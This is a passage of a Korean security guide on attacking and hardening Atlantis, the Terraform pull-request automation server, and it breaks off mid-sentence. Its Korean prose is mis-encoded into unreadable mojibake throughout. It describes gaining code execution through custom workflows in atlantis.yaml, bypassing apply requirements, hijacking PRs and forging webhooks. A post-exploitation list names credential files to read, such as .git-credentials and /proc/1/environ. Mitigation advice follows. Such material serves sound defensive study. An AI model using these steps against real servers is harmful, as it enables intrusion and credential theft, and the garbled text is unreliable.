`atlantis plan` ë˜ëŠ” `atlantis apply`ë¥¼ ì‹¤í–‰í•  ë•Œ terraformì€ ë‚´ë¶€ì ìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ë•Œ, atlantisì—ì„œ terraformì—ê²Œ ëª…ë ¹ì„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ì£¼ì„ì„ ë‹¬ì•„ terraformì—ê²Œ ëª…ë ¹ì„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```

ì¼ë¶€ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆëŠ” í™˜ê²½ ë³€ìˆ˜ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)ì—ì„œ terraform í™˜ê²½ ë³€ìˆ˜ë¥¼ í™•ì¸í•˜ì„¸ìš”.

### ì‚¬ìš©ì ì •ì˜ ì›Œí¬í”Œë¡œìš°

`atlantis.yaml` íŒŒì¼ì— ì§€ì •ëœ **ì•…ì„± ì‚¬ìš©ì ì •ì˜ ë¹Œë“œ ëª…ë ¹ì–´**ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. AtlantisëŠ” `master`ê°€ ì•„ë‹Œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ ë¸Œëœì¹˜ì˜ `atlantis.yaml` íŒŒì¼ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.\
ì´ ê°€ëŠ¥ì„±ì€ ì´ì „ ì„¹ì…˜ì—ì„œ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤:

{% hint style="danger" %}
[**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ëœ ê²½ìš°, ê° ë¦¬í¬ì§€í† ë¦¬ì˜ **`atlantis.yaml`** íŒŒì¼ì— ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ \*\*`allowed_overrides`\*\*ê°€ \*\*`workflow`\*\*ë„ **ì§€ì •**í•´ì•¼ í•˜ëŠ” ê²½ìš°ë„ ìˆìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ Atlantis ì„œë²„ì—ì„œ \*\*ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)\*\*ì´ ì œê³µë©ë‹ˆë‹¤.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### ê³„íš/ì ìš© ë³´í˜¸ ìš°íšŒ

ë§Œì•½ [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allowed_overrides`ì— `apply_requirements`ê°€ êµ¬ì„±ë˜ì–´ ìˆë‹¤ë©´, ë¦¬í¬ì§€í† ë¦¬ëŠ” ê³„íš/ì ìš© ë³´í˜¸ë¥¼ **ìš°íšŒí•˜ì—¬ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```yaml
repos:
- id: /.*/
apply_requirements: []
```

### PR Hijacking

ë§Œì•½ ëˆ„êµ°ê°€ê°€ ìœ íš¨í•œ pull requestì— ëŒ€í•´ **`atlantis plan/apply` ì£¼ì„ì„ ë³´ë‚¸ë‹¤ë©´**, ì›í•˜ì§€ ì•ŠëŠ” ìƒí™©ì—ì„œ terraformì´ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, **branch protection**ì—ì„œ ìƒˆë¡œìš´ ì»¤ë°‹ì´ í‘¸ì‹œë  ë•Œë§ˆë‹¤ PRì„ **ì¬í‰ê°€**í•˜ë„ë¡ êµ¬ì„±í•˜ì§€ ì•Šì€ ê²½ìš°, ëˆ„êµ°ê°€ëŠ” terraform êµ¬ì„±ì—ì„œ ì•…ì„± êµ¬ì„±ì„ ì‘ì„±í•˜ê³  `atlantis plan/apply`ë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ Github ë¸Œëœì¹˜ ë³´í˜¸ ì„¤ì •ì…ë‹ˆë‹¤:

![](<../.gitbook/assets/image (31).png>)

### Webhook Secret

ì›¹í›… ë¹„ë°€ í‚¤ë¥¼ **í›”ì¹˜ëŠ”** ë° ì„±ê³µí•˜ê±°ë‚˜ ì›¹í›… ë¹„ë°€ í‚¤ê°€ **ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°**, Atlantis ì›¹í›…ì„ í˜¸ì¶œí•˜ê³  atlantis ëª…ë ¹ì„ ì§ì ‘ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Bitbucket

Bitbucket CloudëŠ” **ì›¹í›… ë¹„ë°€ í‚¤ë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ë¡œ ì¸í•´ ê³µê²©ìê°€ Bitbucketì—ì„œ ìš”ì²­ì„ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Bitbucket IPë§Œ í—ˆìš©í•˜ë„ë¡ ì„¤ì •í•˜ì„¸ìš”.

* ì´ëŠ” ê³µê²©ìê°€ Bitbucketì—ì„œ ì˜¨ ê²ƒì²˜ëŸ¼ ë³´ì´ëŠ” ê°€ì§œ ìš”ì²­ì„ Atlantisì— ë³´ë‚¼ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
* `--repo-allowlist`ë¥¼ ì§€ì •í•˜ê³  ìˆë‹¤ë©´, ê·¸ë“¤ì€ í•´ë‹¹ ì €ì¥ì†Œì— ëŒ€í•œ ê°€ì§œ ìš”ì²­ë§Œ ìƒì„±í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ê°€ì¥ í° í”¼í•´ëŠ” ìì‹ ì˜ ì €ì¥ì†Œì—ì„œ plan/applyë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
* ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ [Bitbucketì˜ IP ì£¼ì†Œ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)ë¥¼ í—ˆìš© ëª©ë¡ì— ì¶”ê°€í•˜ì„¸ìš” (Outbound IPv4 ì£¼ì†Œ ì°¸ì¡°).

## ì‚¬í›„ ì¹¨íˆ¬

ì„œë²„ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ì ì–´ë„ LFIë¥¼ ì–»ì€ ê²½ìš° ì½ì–´ë³¼ë§Œí•œ í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ ìˆìŠµë‹ˆë‹¤:

* `/home/atlantis/.git-credentials` VCS ì•¡ì„¸ìŠ¤ ìê²© ì¦ëª…ì„ í¬í•¨í•©ë‹ˆë‹¤.
* `/atlantis-data/atlantis.db` ìì„¸í•œ ì •ë³´ê°€ í¬í•¨ëœ VCS ì•¡ì„¸ìŠ¤ ìê²© ì¦ëª…ì„ í¬í•¨í•©ë‹ˆë‹¤.
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform ìƒíƒœ íŒŒì¼
* ì˜ˆì‹œ: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` í™˜ê²½ ë³€ìˆ˜
* `/proc/[2-20]/cmdline` `atlantis server`ì˜ ëª…ë ¹ì¤„ (ë¯¼ê°í•œ ë°ì´í„° í¬í•¨ ê°€ëŠ¥)

## ì™„í™” ë°©ë²•

### ê³µê°œ ì €ì¥ì†Œì—ì„œ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš” <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

ëª¨ë“  ë³´ì•ˆ ì™„í™” ì¡°ì¹˜ê°€ ê°€ëŠ¥í•˜ë”ë¼ë„, ëˆ„êµ¬ë‚˜ ê³µê°œ pull requestì— ì£¼ì„ì„ ë‚¨ê¸¸ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë³´ì•ˆ ì„¤ì •ì„ ì ì ˆí•˜ê²Œ êµ¬ì„±í•˜ì§€ ì•Šì€ ê²½ìš° ê³µê°œ ì €ì¥ì†Œì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì€ ì—¬ì „íˆ ìœ„í—˜í•©ë‹ˆë‹¤.

### `--allow-fork-prs`ë¥¼ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš” <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

ê¶Œì¥ë˜ì§€ ì•ŠëŠ” ê³µê°œ ì €ì¥ì†Œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš° `--allow-fork-prs` (ê¸°ë³¸ê°’ì€ false)ë¥¼ ì„¤ì •í•˜ì§€ ë§ˆì„¸ìš”. ëˆ„êµ¬ë‚˜ ìì‹ ì˜ í¬í¬ì—ì„œ ê·€í•˜ì˜ ì €ì¥ì†Œë¡œ pull requestë¥¼ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

AtlantisëŠ” `--repo-allowlist` í”Œë˜ê·¸ë¥¼ í†µí•´ ì›¹í›…ì„ í—ˆìš©í•  ì €ì¥ì†Œì˜ ëª©ë¡ì„ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ë©´:

* íŠ¹ì • ì €ì¥ì†Œ: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* ì „ì²´ ì¡°ì§: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise ì„¤ì¹˜ì˜ ëª¨ë“  ì €ì¥ì†Œ: `--repo-allowlist=github.yourcompany.com/*`
* ëª¨ë“  ì €ì¥ì†Œ: `--repo-allowlist=*`. ë³´í˜¸ëœ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‚¬ìš©í•  ë•Œ ìœ ìš©í•˜ì§€ë§Œ ì›¹í›… ë¹„ë°€ í‚¤ë¥¼ ì„¤ì •í•˜ì§€ ì•Šìœ¼ë©´ ìœ„í—˜í•©ë‹ˆë‹¤.

ì´ í”Œë˜ê·¸ëŠ” Atlantis ì„¤ì¹˜ê°€ ì œì–´í•˜ì§€ ì•ŠëŠ” ì €ì¥ì†Œì™€ í•¨ê»˜ ì‚¬ìš©ë˜ì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ `atlantis server --help`ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

### Terraform ê³„íš ë³´í˜¸ <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

ì•…ì„± Terraform ì½”ë“œë¡œ pull requestë¥¼ ì œì¶œí•˜ëŠ” ê³µê²©ìê°€ ìœ„í˜‘ ëª¨ë¸ì— í¬í•¨ëœë‹¤ë©´, `terraform apply` ìŠ¹ì¸ë§Œìœ¼ë¡œëŠ” ì¶©ë¶„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. [`external` ë°ì´í„° ì†ŒìŠ¤](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ì•…ì„± ê³µê¸‰ìë¥¼ ì§€ì •í•˜ì—¬ `terraform plan`ì—ì„œ ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œëŠ” ìê²© ì¦ëª…ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. Atlantis ì´ë¯¸ì§€ì— ê³µê¸‰ìë¥¼ í¬í•¨í•˜ê³  ìš´ì˜ í™˜ê²½ì—ì„œ egressë¥¼ ê±°ë¶€í•©ë‹ˆë‹¤.
2. ê³µê¸‰ì ë ˆì§€ìŠ¤íŠ¸ë¦¬ í”„ë¡œí† ì½œì„ ë‚´ë¶€ì ìœ¼ë¡œ êµ¬í˜„í•˜ê³  ê³µê°œ egressë¥¼ ê±°ë¶€í•˜ì—¬ ëˆ„ê°€ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì“°ê¸° ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§€ëŠ”ì§€ ì œì–´í•©ë‹ˆë‹¤.
3. [ì„œë²„ ì¸¡ ì €ì¥ì†Œ êµ¬ì„±](https://www.runatlantis.io/docs/server-side-repo-config.html)ì˜ `plan` ë‹¨ê³„ë¥¼ ìˆ˜ì •í•˜ì—¬ í—ˆìš©ë˜ì§€ ì•Šì€ ê³µê¸‰ìë‚˜ ë°ì´í„° ì†ŒìŠ¤ì˜ ì‚¬ìš© ë˜ëŠ” í—ˆìš©ë˜ì§€ ì•Šì€ ì‚¬ìš©ìì˜ PRì„ ê²€ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ì´ ì‹œì ì—ì„œ ì¶”ê°€ ê²€ì¦ì„ ì¶”ê°€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ `plan`ì´ ê³„ì†ë˜ê¸° ì „ì— PRì— ëŒ€í•œ "ì¢‹ì•„ìš”"ë¥¼ ìš”êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” Conftestë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì›¹í›… ë¹„ë°€ í‚¤ <a href="#webhook-secrets" id="webhook-secrets"></a>

AtlantisëŠ” `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ ì›¹í›… ë¹„ë°€ í‚¤ë¥¼ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤. `--repo-allowlist` í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆë”ë¼ë„ ì›¹í›… ë¹„ë°€ í‚¤ê°€ ì—†ìœ¼ë©´, ì›¹í›… ìš”ì²­ì„ í—ˆìš©ëœ ì €ì¥ì†Œë¡œ ìœ„ì¥í•œ ê³µê²©ìê°€ Atlantisì— ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹í›… ë¹„ë°€ í‚¤ëŠ” ì›¹í›… ìš”ì²­ì´ ì‹¤ì œë¡œ VCS ê³µê¸‰ì(GitHub ë˜ëŠ” GitLab)ì—ì„œ ì˜¨ ê²ƒì„ì„ ë³´ì¥í•©ë‹ˆë‹¤.

Azure DevOpsë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ì›¹í›… ë¹„ë°€ í‚¤ ëŒ€ì‹  ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ê³¼ ì•”í˜¸ë¥¼ ì¶”ê°€í•˜ì„¸ìš”.

### Azure DevOps ê¸°ë³¸ ì¸ì¦ <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOpsëŠ” ëª¨ë“  ì›¹í›… ì´ë²¤íŠ¸ì—ì„œ ê¸°ë³¸ ì¸ì¦ í—¤ë”ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì›¹í›… ìœ„ì¹˜ì— HTTPS URLì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

ì›¹í›… ë¹„ë°€ í‚¤ë¥¼ ì‚¬ìš©í•˜ë”ë¼ë„ íŠ¸ë˜í”½ì´ HTTPë¥¼ í†µí•´
